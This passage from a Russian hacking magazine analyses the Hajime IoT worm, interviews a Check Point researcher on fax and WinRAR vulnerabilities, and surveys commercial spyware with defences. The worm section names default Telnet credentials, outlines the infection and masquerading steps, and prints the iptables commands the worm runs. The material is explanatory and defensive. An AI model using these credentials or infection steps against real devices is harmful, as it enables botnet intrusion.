ux умных устройств, а самым нас тоящим сетевым червем, способным объ‐
единять зараженные девайсы в ботнеты. Трой получил имя Hajime — это сло‐
во используется в япон ских единоборс твах в качестве команды к началу
поединка. Схватка между Linux.Hajime и интернетом вещей получи лась увле‐
кательной, но главное — она продолжается до сих пор.


ВЗЛОМ УСТРОЙСТВА
Как и в случае Mirai, в архитектуре Hajime использует ся генератор случайного
диапазона IP, из которого исклю чаются локальные и служеб ные адреса, пос ле
чего полученный массив данных передается ска неру. Тот последовательно
стучится на 23‐й TCP‐порт по каждому из адресов, пробуя установить Telnet‐
соединение. Если попытка увенчалась успехом, Hajime начинает брутить ата‐
куемый хост с исполь зованием сло варя, зашитого в самом трояне.
  Список логинов и паролей в сло варе ана логи чен тому, который исполь‐
зует Mirai, разве что к нему добавились пары значений root/5up и Admin/5up,
с помощью которых Hajime атакует ряд моделей роутеров TP‐Link и Atheros
с дефолтной про шивкой. Главное отли чие кро ется в том, что Mirai пытается
авторизоваться на удаленном устройстве, перебирая логины и пароли в слу‐
чайном порядке, в то время как Hajime стро го следует спис ку, причем после
каждой неудачной попытки авториза ции он закрыва ет текущее Telnet‐соеди‐
нение и создает новое.
  Подобно разработчикам Mirai, создатели Hajime пред полагали, что поль‐
зователи умных устройств далеко не всег да меняют заводские настрой ки,
поэтому словарь содержит набор дефолтных логинов и паролей для раз ных
девайсов. Взлом будет успешен только в том слу чае, если владелец аппарата
поленился изменить предустановленные на заводе‐изготовителе параметры
авторизации, то есть сам себе злоб ный антропоморфный дендромутант.





                    Словарик для брута Hajime

Если брут удался, Hajime отправляет устройству команду enable, чтобы
получить доступ к привилегированному режиму интерфейса командной стро‐
ки. За ней следует команда system для перехода в меню системных опций,
а затем команды shell и sh запускают командный интерпретатор. Чтобы про‐
верить, запустился ли нуж ный для его работы шелл, Hajime передает на ата‐
куемый хост строку /bin/busybox ECCHI. Специфические оболочки не смо‐
гут обработать эту команду, в то время как стандартный sh запустит BusyBox,
который вернет сооб щение об ошиб ке в аргументе — ECCHI: applet not
found. Это позволит Hajime понять, что он на верном пути.


ИССЛЕДОВАНИЕ ДЕВАЙСА
Окончательно убедив шись в том, что он попал в Linux‐окружение и имеет дос‐
туп к командной строке, Hajime начинает исследовать взломанное устрой‐
ство. Для начала он получа ет из файла /proc/mounts список смонтирован‐
ных файловых систем и ищет открытые на запись папки. Обнаружив первую
такую папку, отличную от /proc, /sys или /, Hajime проверяет, действительно
ли в нее разрешена запись и не хранится ли уже в ней троянский бинарник.
В дальнейшем эта папка будет использоваться в качестве рабочей дирек‐
тории.
  Затем Hajime исследует заголо вок файла /bin/echo, чтобы определить
тип процессора скомпрометированного устройства. В зависимости от аппа‐
ратной архитек туры на девайс будет ска чан соответствующий ELF‐файл,
в котором реализован инфектор, доставляющий в систему полезную наг‐
рузку. Hajime поддержи вает ARMv5, ARMv7, MIPS и, конечно же, Intel x86‐64.


ИНФЕКТОР
Выяснив, какой процессор уста новлен на взломанном девайсе, Hajime
отправляет командному интерпретатору директиву wget для загрузки бинар‐
ника  для  соответству ющей  архитектуры.  Этот  ELF‐файл  занимает
менее 500 байт и изначально написан на ассемблере. Семплы бинарника,
разработанные под различную аппа ратную конфигурацию, отличаются друг
от друга незначительно, в час тнос ти имеют разную структуру sockaddr раз‐
мером 6 байт, в которой сохраня ется IP‐адрес и номер порта девай са, откуда
изначально выполнялся брут скомпромети рованного устрой ства. В этом
и есть одна из особенностей Hajime: адрес для получения полезной нагрузки
записан в структуре sockaddr самого инфектора, а не определяется динами‐
чески.
  Инфектор устанавливает TCP‐соединение с указанным хостом и принима‐
ет оттуда поток байтов. Этот поток перенаправляется на стандартный вывод
stdout и по конвейеру сохраня ется в файл, который будет запущен на выпол‐
нение. Так на взломанное устройство попада ет основной модуль трояна.
   Где‐то с середины 2017 года соз датели некото рых версий Hajime перес‐
тали заморачиваться с ассемблерными инфекто рами и вместо этого начали
качать полезную нагрузку с помощью Wget или TFTP. Процесс заражения стал
проще, но при этом несколько потерял в надежности.


ОСНОВНОЙ МОДУЛЬ ТРОЯНА
Запустившись в системе, основной модуль Hajime пытается убить все про‐
цессы, имеющие входящие и исходящие соединения с 23‐м портом, для чего
анализирует содержимое файлов /proc/net/tcp и /proc/net/tcp6. Затем
троян модифицирует iptables, чтобы перекрыть дос туп к портам 7547, 5555,
5358, и удаляет цепочку CWMP_CR, которая используется в час ти роутеров
Movistar:


iptables ‐A INPUT ‐p tcp ‐‐destination‐port 7547 ‐j DROP
iptables ‐A INPUT ‐p tcp ‐‐destination‐port 5555 ‐j DROP
iptables ‐A INPUT ‐p tcp ‐‐destination‐port 5358 ‐j DROP
iptables ‐D INPUT ‐j CWMP_CR
iptables ‐X CWMP_CR

После инициализации Hajime отправляет NTP‐запрос к серверу pool.ntp.org,
чтобы определить временную зону устрой ства, а также корректное значение
текущей даты. Если запрос не дал результата, исполь зуется локальное время.
Точное определение времени и даты очень важно для синхронизации бот‐
нета, а некоторые умные устройства, где используются установленные
по умолчанию параметры авторизации, имеют неправильную конфигурацию
системного времени. Если пользователь не изме нил логин и  пароль,
с чего бы ему менять другие нас тройки? Создатели Hajime учли этот тонкий
момент.
  Затем командой unlink трой уда ляет собствен ный файл из системы, пос‐
ле чего при помощи функции strcpy меня ет символьную строку argv[0],
в которой хранится имя программы, на telnetd. Наконец, с использованием
системного вызова prctl(PR_SET_NAME, argv[0]) он меняет имя своего
процесса.  Таким  хитрым  способом  Hajime  пытается  замаскироваться
под стандартный демон Telnet, чтобы не вызывать у юзера подозрений.
   Дальше управле ние переда ется модулю, который отвечает за работу DHT‐
протокола  Kademlia,  предназначенного  для  орга низации  одноранговых
децентрализованных файлообменных сетей. Непос редственно для приема
и передачи данных ботнет использует транспортный протокол uTorrent. Это,
в частности, позволяет зараженным девайсам успешно работать под NAT.


БОТНЕТ
Маршрутизация в ботнете Hajime базируется на модифицированном проекте
KadNode, который поддерживает шиф рование и инфраструктуру открытых
клю чей (PKI). Передаваемые файлы сжимаются при помощи модифицирован‐
ного алгоритма LZ4, но некоторые файлы могут транслироваться и в нес‐
жатом виде.
  После  инициализации  протокола  Hajime  уста навливает  соеди нение
с пирами Torrent‐ботнета и скачивает актуальный конфиг. Для опоз навания
пиров в сети используются уникальные идентификаторы ботов, генери‐
руемые на основе текущей даты и хеша SHA‐1, полученного от имени файла
трояна. Наличие свежего конфигурационного файла на других узлах ботнета
Hajime проверяет с интерва лом в десять минут.
   Типичный кон фиг содержит обоз начение про цес сорной архитектуры,
для которой собраны исполняемые файлы, имена этих файлов и timestamp,
позволяющий трою определить их версию. Если файл в сети свежее того,
информация о котором сохранена в локальном конфиге вредоноса, он ска‐
чивает бинарник для соответству ющей аппа рат ной конфигурации и запус кает
его в качестве своего дочернего процес са. Ана логичным образом работает
самообновление Hajime.
   P2P‐ботнет, созданный по такой схеме, получа ется одноранговым, а зна‐
чит, децентрализованным и отка зоустойчивым. Он не зависит от наличия
управляющих серверов, следова тельно, не прекращает свою деятельность,
если какое‐то количество инфицированных устрой ств вдруг «вылечится»
или перестанет работать. Да и засин кхо лить такой ботнет, чтобы перехватить
управление, физически невозможно.
  Обосновавшись в системе, Hajime запускает цикл генерации и опроса IP‐
адресов,  чтобы  продолжить  заражать  уязвимые  сетевые  устройства.
При этом сам хост выступа ет в роли сервера, с которого скачивается
исполняемый файл инфектора и тело троянца. Если для зараже ния какого‐то
удаленного хоста требуется файл с поддержкой другой аппаратной архитек‐
туры, Hajime может подтянуть его из пирин говой сети.


ЦЕЛИ, ЗАДАЧИ И ВЫВОДЫ
В Hajime по умол чанию не предусмотрены какие‐либо деструктивные фун‐
кции за исключением одной: трой может ска чивать и запускать на инфи циро‐
ванном устройстве любые приложения. Ключевое слово здесь — «любые».
Поэтому для ботово да не составит никако го тру да при необходимости уста‐
новить на все зараженные девайсы модуль для реализации DDoS‐атак, бэк‐
дор, майнер или просто продавать инсталлы всем желающим, зарабатывая
за счет других вирусописателей. Ины ми словами, готовый ботнет можно
монетизировать множес твом раз личных спо собов. Но как бы то ни было,
о назначении трояна до сих пор строятся догадки и предположения.
  Существует  несколько  методов защиты  от  Hajime. Можно  закрыть
на потенциально уязвимом устройстве порт 4636, через который трой качает
полезную нагрузку. Можно блокировать все входящие соеди нения на порт 23,
если в запросе присутству ет строка /bin/busybox ECCHI — явный индикатор
атаки. Но лучше всего правиль но настро ить параметры авторизации по про‐
токолам Telnet и SSH, используя сложные пароли: это защитит девайс от бру‐
та по словарю, который применяют Hajime и Mirai, а владельцу такого устрой‐
ства позволит сберечь нервы.
ВЗЛОМ

     ИНТЕРВЬЮ
 С ЯНИВОМ БАЛМАСОМ





    ГЛАВНЫЙ РЕСЕРЧЕР CHECK POINT
    О ВЗЛОМЕ WINRAR И О ХАКЕРАХ
        НА СЛУЖБЕ КОМПАНИИ





На  ежегодной  конференции  компании
Check Point в Вене мы встретились с гла вой
исследовательского подразделения  ком‐
пании Янивом Балмасом. Янив расска зал
«Хакеру» о том, как штатные ресерчеры       Андрей Письменный                                                                                      Главный редактор
помогают Check Point быть в курсе новых         apismenny@gmail.com
угроз, а также рас крыл подробности недав‐
него взлома WinRAR, который проходил
под его руководс твом.


В 2019 году компания Check Point провела конференцию CPX в трех городах:
Лас‐Вегасе, Бангкоке и Вене. Если ты вдруг не слышал о Check Point, то
это один из ведущих провайдеров безопасности, который выпускает как соф‐
тверные, так и хардверные продукты — по боль шей части корпоративные.
Штаб‐квартира компании рас положена в Тель‐Ави ве, а офисы и центры раз‐
работки — по всему миру. Всего в них работает около 4000 человек.





Помимо выступле ний спикеров, демонс трации продуктов Check Point и пар‐
тнерских стендов, на конференции было еще много интересного. В частнос‐
ти, впервые на CPX появилась такая вещь, как Geek Village, где хакерам соз‐
дали максимально родную атмосферу (то есть полумрак, зеленую подсветку
и музыку) и предложили конкурсы и воркшопы по реверсу малвари, крип‐
тографии, взлому замков и прочим увлекательным занятиям.
  Мне же  в свободное  от кейноутов время предложили встретиться
с кем‐нибудь из спикеров компании. Без раз думий я попросил о встрече
с Янивом Балмасом. Еще бы: Янив — хакер с серь езным стажем и автор мно‐
гочисленных исследований, с одним из них он выс тупал на DEF CON, с дру‐
гим — на CCC. Впрочем, не будем забегать вперед.

— Расскажи о себе, о сво ей карьере
в Check  Point, чем ты занимаешься,
за что отве чаешь.
 — Я глава исследовательского подразде‐
ления в Check Point. Под моим руководс твом
трудится группа примерно из тридцати человек
с крутым техническим бэкгра ундом. Все они —
реверсеры с многолетним опытом. Мы занима‐
емся всем, включая ана лиз малвари, изу чение
уязвимостей и способов экс плуатации, а также
всех сопутствующих вещей. В общем, мы — техничес кая ветвь Check Point.
  — Ваша работа потом находит примене ние в про дук тах Check
Point?
 — Это как раз наша основная забота. Ресерчеры обычно очень отдалены
от разработки. Нужно как‐то брать полученные ими знания и интегри ровать
в продукты. Это далеко не так тривиально, как может показаться, но мы ста‐
раемся! В итоге многие открытия моей группы находят свое при менение
в разработках Check Point.
  — Как вы выбираете, что ресерчить?
 — О, вот это вопрос на миллион! Но в общих чертах цели можно поделить
на несколько категорий. Если речь об изу чении малвари, то все зависит
от того, что сейчас распространено. Вооб ще, вредоносное ПО — это наше
основное поле деятель нос ти. Сюда же относятся и APT, например. Если
говорить о вещах вроде сегодняшнего анонса про WinRAR, то здесь цель,
конечно, выбираем мы сами. Как? Чаще всего — руководствуясь интуицией.
  — То есть ресерчеры во мно гом сами выбирают, чем им
заниматься?
 — У нас есть ежемесячные совещания, на которых мы садимся и пред‐
лагаем идеи, обсуждаем их и вносим разные предложения. Каждая идея под‐
вергается критике, сравнимой с критикой научной публикации. Если удалось
пройти этот процесс, то да, мы берем идею в работу.
  — Расскажи о том, как ты вооб ще пришел к этой про фессии.
Ты ведь начал еще в девяностые?
 — Да, я постарше, чем я выг ляжу, — мне в этом году исполни лось сорок.
Но компьютерами я интересовался с малого воз раста, с шести лет. У меня
был Commodore 64. И когда я начинал, интернета еще не было — по крайней
мере у простых людей. Я много играл в игры, потом можно было сидеть в IRC
через сеть университета. Я думаю, мои пристрас тия сформировались ког‐
да‐то тогда, благодаря сообществу. А еще хотелось играть, а игры стоили
денег и были защище ны от копирования. Это, кстати, был рас пространенный
способ приобщиться к миру кибербезопас ности.
  — В тво ем био написано, что ты владеешь глу боким видением
прош лого и будущего киберугроз.
 — Правда? (Смеется)
  — Да, и что у тебя уникальный взгляд на лан дшафт инфо сека.
Но давай разобьем это на части. Пока оставим в покое прош лое
и погово рим сначала о настоящем, а потом — о будущем.
 — Хорошо. Ну если говорить про то, что происхо дит сейчас, то нас инте‐
ресуют такие вещи, как новые семейства вредоносов, новые опас ные груп‐
пировки киберпреступников, важ ные случаи APT. И конечно, свя занные с этим
уязвимости и векторы.
  — Твоя главная головная боль сегод ня — это...
 — О, у меня их много! Киберпрес тупность не дает нам расслабляться!
Но основная проб лема в том, что экосистема становится все сложнее
и сложнее. Если бы пять‐шесть лет назад ты спро сил у меня, какая малварь
сейчас  актуальна, я бы ответил, что это банкеры, вымогатели и еще
что‐нибудь. А сейчас все страшно переплелось и стало так сложно, что мы
еле успеваем разбирать ся. Так что главная головная боль — это, пожалуй,
понять текущую экосистему. И это, кстати, не совсем техническая задача,
а скорее что‐то вроде разведки. Преж де чем начать делать что‐то техничес‐
кое, сначала нужно понять ландшафт. Вот это уже очень сложно.
  — Что кон кретно для это го нуж но делать? Монито рить форумы?
 — Есть разные способы, монито ринг форумов — это один из них. Дру‐
гой — телеметрия, которую мы получаем из разных источников. Есть
еще специальные инструменты, которые мы создаем сами. Также мы пос‐
тоянно работаем над средства ми обработки этой информации. Сложность
этих механизмов дол жна быть сопоставимой со сложностью экосистемы.
  — В прош лом году мно го шума наделали атаки по сто рон ним
каналам вро де Meltdown, Spectre и новых вариаций Rowhammer.
Есть ли шанс, что что‑то подоб ное вско ре появится в дикой при-
роде, а не только в науч ных работах?
 — Вот тут ты затронул очень важ ную тему. Если посмотреть на историю
появления уязвимостей и экспло итов, то видна одна важная тенденция. Мно‐
гие помнят, как в середине девяностых Aleph One впервые научился эксплу‐
атировать перепол нение буфера. Он опуб ликовал в Phrack статью Smashing
The Stack For Fun And Proﬁt. Это было, считай, ака демичес ким исследова‐
нием, не было настоящих атак, которые бы эксплуатировали эту уязвимость.
Они не появились ни на следующий день, ни на сле дующий год. Прошло
серьезное время, прежде чем до людей дошло, как именно пользоваться
этим. А потом — раз — и атаки этого типа стали появляться абсолютно пов‐
сюду. Оказалось, что это мощнейший вектор, и защиты, считай, не было. Вна‐
чале все пытались решить эту проблему в софте, и это работало не очень,
и кончилось тем, что Intel и другим произво дителям процессоров пришлось
внести изменения в железо. Потом точно так же была найдена следующая
вещь: с ROP, например, тот же цикл повторился снова. Так что Spectre, Melt‐
down и Rowhammer на данном этапе — это лишь академические исследова‐
ния. Но это потрясающие атаки, реально гениальные. Пока что никто не зна‐
ет, как их использовать, но, на мой взгляд, это лишь вопрос времени. И когда
начнут появляться рабочие экспло иты, мы окажемся в большой беде, как уже
бывало раньше. Потребуется мас са времени, чтобы создать надежную
защиту. Учитывая, что она должна быть в железе, это будет сложно и может
затянуться.


             INFO

                     Подробнее о Meltdown и Spectre читай в статье
                            «Разбираем фундамен тальные уязвимости в про‐
                      цессорах».



— Как ско ро мы можем увидеть реальные атаки? В течение пары
лет?
 — Не исключено. Но это только мое предсказание.
  — Лад но, давай вспомним, что еще инте ресного может быть
в ближайшее вре мя. На горизон те 5G, и со вре менем у каж дой
«умной» вещи будет свой доступ в интернет и адрес IPv6. Соот-
ветствен но, все они окажутся в «большом» интерне те, а не
в локальной сети за NAT. Как думаешь, все разом нач нет ломать-
ся?
 — Я думаю, в реальности — нет. Каждый раз, как появляется новая тех‐
нология, всегда все говорят о том, что будет катастрофа. Но до сих пор
никаких особенных катастроф не было. Да, появятся новые уязвимости,
вырастет поверхность атаки. С новыми технологиями всегда так: сначала
с защитой дела обстоят неважно, но потом все как‐то приспосабливаются
и живут дальше. В общем, я думаю, конца света не будет и все продол жит
работать.
  — Расскажи о каком‑нибудь кру том про екте из того, чем вы
занимались.
 — Не знаю, слышал ли ты, но у нас отно сительно недавно была разработ‐
ка, связанная с факсами. Мы опубликовали концепт в августе 2018 года.
Работает это очень просто. Сегодня в роли факсов обычно выс тупают МФУ,
а МФУ зачастую подключены к внутренней сети организации. Что произой‐
дет, если кто‐нибудь подключится к МФУ через телефонную линию и отправит
специально сформированный факс? Нам уда лось это проделать. Мы протес‐
тировали этот метод на устройствах HP и обна ружили, что уязвима вся линей‐
ка OﬃceJet, в которой больше 400 моделей.
  — Как это работает? Факс же вро де аналого вая машина.
 — Да, полностью аналого вая и работа ет через телефонную сеть, но внут‐
ри принтера — процессор, который обрабатывает эти аналоговые сигналы
и передает их софту. А вот в этом софте и нашлись баги!


Faxploit
Найденная командой Check  Point уязвимость использует две проблемы
переполнения буфера в составе про токола для факсов. Они позволя ют
встроить вредоносный код в изображения, которые факсимильный аппарат
декодирует и загружает в свою память, а затем малварь распространяется
по сетям, к которым подклю чено устройство. Таким образом атакующий
добивается удаленного исполнения произволь ного кода и может рас‐
пространить в сети организа ции любое вредоносное ПО.





Более подробно — в нашей новости и в выс туплении Яни ва на DEF CON 2018.



— Это твоя раз работка? Кстати, расскажи про свою карьеру, что
ты делал до Check Point?
 — Да, PoC с факсами — это была моя работа. До Check Point я тоже
ресерчил — под моим именем опуб ликовано нес коль ко CVE. До этого у меня
был интересный проект с использованием KVM. Не в смысле виртуализации,
а в смысле свитчей, переключающих клавиатуру, монитор и мышь между дву‐
мя компьютерами. Например, в пра вительственных организациях широко
применяются такие устройства. Если есть возможность получить физический
доступ к свитчу KVM, то можно проана лизи ровать и изменить его прошивку,
а потом залить новую, которая будет переда вать данные атакующему.





           Янив Балмас рассказыва ет о взломе KVM на 32C3


— Зву чит кру то. Но давай вернемся к вашему иссле дованию Win-
RAR, о котором вы сегод ня рассказывали. Как вам удалось найти
уяз вимость?
 — Мы много занимаемся фаз зингом и достигли в этом больших успехов.
У нас под это выделена большая инфраструктура и есть воркфлоу, который
позволяет автоматически выявлять уяз вимости в исполня емых файлах.
  — И вы про веряете им популярный софт?
 — Мы очень аккуратно выбираем цели. Они должны под ходить под нашу
инфраструктуру и вооб ще в целом быть интересными. Если выбрать правиль‐
но, то можно получить очень интересные результаты.
  — Эта инфраструк тура — чисто ваша раз работка?
 — Мы используем разные утилиты, в том числе опенсорсные, иногда
модифицируем их. Но тут важен не только софт — важно отладить сам про‐
цесс. В общем, это сложная штука.
  — Какие, думаешь, будут последствия раскры тия уяз вимости?
 — Мы в первую очередь связались с Rarlab, и архиватор уже запатчили.
К сожалению, немногие люди обновляют WinRAR и у него нет механизма
автоматического обновления. Но мы не пуб ликова ли никаких частей экспло‐
ита: мы такого никогда не делаем и считаем, что это было бы безответствен‐
но. Так что злоумышленники не могут прос то взять и скачать код, а потом пой‐
ти и начать взламывать. Но информа ция опуб ликована, так что, обладая
определенными навыками, кто‐то может най ти то же, что нашли мы. И если он
не будет таким же ответс твенным, как и мы, это может стать проблемой.
Но мы, конечно же, встроили соответству ющие защитные механизмы в наш
софт.
  — У людей вряд ли есть про дук ты Check Point на компьюте рах.
 — Это верно, но они могут просто обновить WinRAR. Или снести его и пос‐
тавить 7‐Zip.
  — Ты уве рен, что это правильный выбор — рассказать о такой
уяз вимости, даже если есть шанс, что после это го о ней узнают
преступники?
 — Это большая дилемма в нашей профессии. Можно, конечно, мол чать
и никому не говорить, кроме разработ чика, который по‐тихому запатчит уяз‐
вимость, или можно рас ска зать всем. Это обсуждалось сообществом много
лет, и решение — это обна родовать находки. Что, если преступники раскроют
уязвимость сами и будут ее скрытно использовать? Публикуя информацию,
мы, по крайней мере, привлека ем внимание к проблеме. И надеемся, что
люди успеют поставить обновления до того, как им будет что‐то угрожать.


Уяз вимость в           WinRAR
Найденный логический баг свя зан со сторонней биб лиоте кой UNACEV2.DLL,
которая входит в состав практически всех версий архи ватора с незапамятных
времен. Эта библиотека отвечает за рас паковку архивов формата ACE и не
обновлялась давным‐давно. Ока залось, что можно создать специальный
архив ACE, который при распаковке сможет поместить вредоносный файл
в произвольном месте, в обход фактического пути для рас паковки архива.





Буквально через несколь ко дней после публикации ис следования Check Point
и нашего разговора с Янивом эксперты 360 Threat Intelligence Center сообщи‐
ли, что уязвимость уже находит ся под атакой. Спа меры начали прикладывать
к своим посланиям вредонос ные архивы, которые при распаковке заражают
машину пострадавшего бэкдором.



— Что еще нас ждет в ближайшем будущем?
 — Я уже рассказывал о том, что мы много используем фаз зинг, чтобы
искать уязвимости. Это вообще стало распространенной практикой в индус‐
трии. На какую конференцию ни пойдешь, все время слышишь, что многие
занимаются фаззингом — с разными успехами. Если посмотреть на список
CVE, отправленных в 2017 и 2018 годах, можно увидеть огромный прирост. Я
думаю, немалый вклад в это внесли технологии фаззинга, которые сейчас
стали зрелыми. Но много уязвимос тей вовсе не означает, что становится
много эксплоитов. Иногда уязвимость слиш ком сложно эксплуатировать, но я
думаю, что эта технология принесет нам еще мно го работы — пос кольку ее
используют и хорошие ребята, и плохие.
ВЗЛОМ

 КОММЕРЧЕСКИЙ
    SPYWARE





                                        ShəLMā
                                            schelma@protonmail.com





      КАК ДЕЙСТВУЮТ ПОПУЛЯРНЫЕ
    ШПИОНСКИЕ ПРОГРАММЫ И КАК
        ОТ НИХ ЗАЩИТИТЬСЯ




Трояны со встроенным кейлоггером и функци ями похищения
критически важных данных — это одна из старейших раз‐
новидностей малвари. За четверть века шпионский софт
только  эволюционировал,  получая  все  новые  функции
защиты  от  детекта. Заодно были  освоены мобильные
устройства, появи лись разновидности троянов, предназна‐
ченные для таргетиро ванных атак. В этой статье мы рас‐
смотрим наиболее известных предста вителей коммерческих
шпионских программ и поговорим о защитных мерах.


Казалось бы, самый очевидный способ защитить ся от любого компьютерного
шпиона — установить антивирус и навсегда забыть о проблеме. Но «очевид‐
ный» — не синоним сло ву «эффективный». Большинс тво антивирусных прог‐
рамм ловит троянов примерно так же, как конт рразведчики вычисляют нас‐
тоящих шпионов: по отпечаткам пальцев, то есть методом сигнатурного
детектирования.


             INFO

                      Сигнатура — это хранящийся в специальной базе
                       уникальный идентификатор файла, с помощью
                       которого можно отличить его от других. Если
                      образец  это го  вредоносного  файла  ранее
                      не исследовался в вирусной лаборатории и его
                         сигнатура  не  добавлена  в  базы,  антивирус
                      не сможет опознать его.


Есть разные способы обойти сигнатурный детект — «Хакер» о них неод‐
нократно писал. Остается еще эвристика. Но и эвристические механизмы
поиска угроз, опирающиеся на поведенческий ана лиз, выпол нение прог‐
раммы в песочнице и прочие ухищрения, — не панацея, иначе антивирусы
не сталкивались бы с ложными срабатывани ями. Ины ми словами, даже если
на твоем компьюте ре уста новлена самая современная защита, это отнюдь
не означает, что ты в безопасности.
   Какие же коммерческие программы‐шпионы наиболее популярны сей час
на рынке и как вычислить их присутс твие в системе?


FINFISHER
Кибершпионская софтина под наз ванием FinFisher, она же FinSpy, была раз‐
работана компанией Gamma Group и применя лась, по слухам, для политичес‐
кой слежки за журналистами и диссидентами в раз ных странах мира. Прог‐
рамму в 2011 году слил в WikiLeaks Джу лиан Ассанж, после чего она стала
достоянием ано нимусов и подверглась присталь ному изучению со стороны
специалистов по информационной безопасности и прочих заинтересованных
лиц. «Хакер» уже расска зывал об этой замечательной программе.
   FinFisher может перехватывать переписку жертвы в соци альных сетях,
отслеживать почтовые сооб щения, работать кейлоггером, предоставлять
доступ к хранящимся на инфицированной машине файлам, а также записы‐
вать видео и аудио с помощью встроенного микрофона и камеры. Существу‐
ют сборки FinFisher под Windows, macOS и Linux. Кроме того, были соз даны
мобильные версии трояна практически для всех существующих сегодня плат‐
форм: Android, iOS, BlackBerry, Symbian и Windows Mobile.





              Ин терфейс главного окна FinSpy Agent

Схема распространения FinFisher типична для троянов: шпион раздавал ся
с помощью  загрузчиков,  которые  рассылались по  электронной  почте
под видом полезных приложений или прилета ли на компьютер с обновле‐
ниями ранее установленной безопасной программы. В одной из атак, ис сле‐
дованных ребятами из ESET, использовалась также реализация схемы MITM:
при попытке скачать нужную прог рамму ничего не подозревающая жертва
перенаправлялась на фишинговый сайт, откуда загружала дис трибутив «с
сюрпризом». В рассмотренном ESET примере FinFisher был встроен в дис‐
трибутив утилиты TrueCrypt. Ирония заключа ется в том, что юзер, желающий
защитить свои данные и зашифровать диск для пущей безопасности, своими
руками устанавливал spyware на собственную машину.
  Создатели постарались сделать работу FinFisher максимально незаметной
и всячески затруднить обнаружение тро яна. В его коде имеются функции
антиотладки, предотвращения запус ка в вир туаль ной машине, противодей‐
ствия дизассемблированию, а сам код обфусцирован. Кроме того, прог‐
рамма старается действовать в зараженной системе незаметно и лишний раз
не обращать на себя внимание пользователя.


Защита
Выловить FinFisher на устройстве вручную — весьма нетривиальная задача.
Известные семплы успешно детектируются и удаляются популярными анти‐
вирусными программами, а вот неизвес тные… С ними сложнее.
   Как бы банально это ни звучало, но очевидным (и весьма действенным)
средством защиты от это го шпиона служит правильно нас троенный файрвол.
Во время работы FinFisher устанавлива ет соединение не только со своим
управляющим сервером (его адрес может меняться от семпла к семплу), но и
с несколькими другими хостами, откуда подгружаются его компоненты. Если
настроить брандмауэр так, что он будет параноидально блокировать соеди‐
нения приложе ний с неизвес тными узлами, FinFisher не сможет нормально
работать на таком устройстве. Ну а что бы не получить протрояненную доб‐
рожелателями софтину вмес то чистого дистрибутива, лучше качать прог‐
раммы по HTTPS и не лениться проверять цифровую подпись устанавлива‐
емых приложений.


ADWIND
Эта кросс‐платформенная программа, которую можно отнести к категориям
RCS (Remote Control System) или RAT (Remote Access Tool), получила извес‐
тность в 2016 году, а выявлена была еще рань ше — в 2013‐м. «Хакер» уже пи‐
сал о ней. Этот трой известен под раз ными именами: Sockrat, JSocket, jRat,
Unrecom, Frutas и AlienSpy. Фактичес ки все это — перепевки одной и той же
мелодии.





                    Ин терфейс Adwind RAT

Поскольку Adwind написан на Java, он ориенти рован практически на все плат‐
формы, где есть ее поддержка: Windows, Linux, macOS и, конечно же, Android.
Популярность Adwind у анонимусов объясня ется прежде всего тем, что трой
долгое время распространялся по схеме SAAS (Software as a Service), то есть
по подписке. У разработчиков был свой интернет‐магазин, служба техничес‐
кой поддержки и даже рекламный канал c видосами на PornHub YouTube. Цен‐
ник был вполне демок ратичным: от 20 до 300 вечнозеленых американских
долларов в зависимости от выбранного пакета услуг. Вторая причина —
относительная простота получения рабочего покриптованного бинарника,
который не будет палиться антивирусами — по крайней мере до тех пор, пока
кто‐нибудь не зальет его на VirusTotal.
  Основное назначение трояна — предос тавлять доброжелателям несан‐
кционированный доступ к скомпрометированной машине. Кроме того, он
может делать скрин шоты, фиксировать нажатия кла виш, воровать из браузе‐
ров сохраненные пароли и данные форм, а также баловаться с камерой
и микрофоном.
  Основной канал распростра нения шпи она — электронная почта. Потен‐
циальным жертвам атаки рас сылали пись ма, либо имеющие во вложении
даунлоадер в формате .JAR, либо содержащие HTML‐код со вставками
на VBScript и JScript, который втихаря подтягивал на машину JRE и дроппер
трояна. Аналитики из «Лаборатории Касперского» фиксировали также случаи
распространения Adwind с использованием документов RTF, содержащих
эксплоит для уязвимости CVE‐2012‐0158.


Защита
Чтобы защититься от проделок Adwind, можно отклю чить на компьютере Java
или снести Java Runtime — не дожидаясь, как говорится, перитонита.
И разумеется, не устраивать соревнований по ско ростному откры тию аттачей
в электронных сооб щениях, полученных от подозрительных отправите лей.
Если Java тебе таки очень нужна, еще один при митивный, но действенный
метод защиты от Adwind — смена ассоциации файлов .JAR с JRE на, скажем,
notepad.exe.
  В Android полностью выкорчевать Java по понятным причинам невоз‐
можно, но там достаточно всего лишь не рутовать девайс и не устанавливать
что угодно откуда попало, ограничившись Google Play в качестве основного
источника приложений.


DROIDJACK
Так называется, наверное, самая известная коммерчес кая ути лита удален‐
ного управле ния для Android, которая основана на приложении Sandroid. Эта
тул за состоит из двух компонентов: клиентской и серверной части. Одна уста‐
навливается на смартфон или планшет в виде файла APK, вторая реализова‐
на как обычное приложение Windows, которое позволя ет управлять устрой‐
ством. Пожизненная лицензия на эту софтину стоит 210 долларов.





                  Ин терфейс утилиты DroidJack

DroidJack  позволяет  переда вать  текущие  GPS‐координаты  девайса,
управлять входящими и исходящими вызовами, записы вать телефонные раз‐
говоры, читать и отправлять SMS, сооб щения в WhatsApp, просматривать
историю браузера, список запущенных приложений, копировать контакты,
получать изображение со встроенной камеры, управлять громкостью и мно‐
гое другое.
  Очевидно, что для работы DroidJack нуж но сна чала установить приложе‐
ние на устройство. Сделать это можно, либо физичес ки завладев им, либо
каким‐то образом  вынудив  пользователя пос тавить  программу самос‐
тоятельно. У большинства извес тных на сегодня семплов DroidJack отсутству‐
ют какие‐либо механизмы скрытной уста новки.
   Тулза свободно продается, но цена не осо бенно демократичная. Именно
поэтому добрые девелоперы разработа ли более дешевые аналоги этой
программы — среди них можно отметить, например, OmniRAT, способную
похвастаться почти таким же набором функций, но в четыре раза дешевле.


Защита
Первое, на что следует обра тить внимание поль зователю, — и DroidJack,
и OmniRAT требуют при инсталляции большое количество раз решений. Если
ты пытаешься поставить на свой смартфон фонарик, резонно задуматься,
зачем ему доступ к отправке SMS и адресной книге.
   Во‐вторых, даже несмотря на то, что шпион уда ляет свой значок из списка
приложений, работающую программу все равно видно в перечне запущенных
процессов. Наконец, DroidJack прекрасно ловит ся большинством современ‐
ных антивирусов для Android, поэтому регулярная проверка устройства быва‐
ет все же небесполезна.


PEGASUS
Пегас — это, как известно, конь с крыль ями. Применительно к Android и iOS
Pegasus — это троянский конь, одна из известней ших раз новидностей ком‐
мерческих мобильных шпионов.
  Лю бопытно, что Pegasus способен устанавливаться на мобильные устрой‐
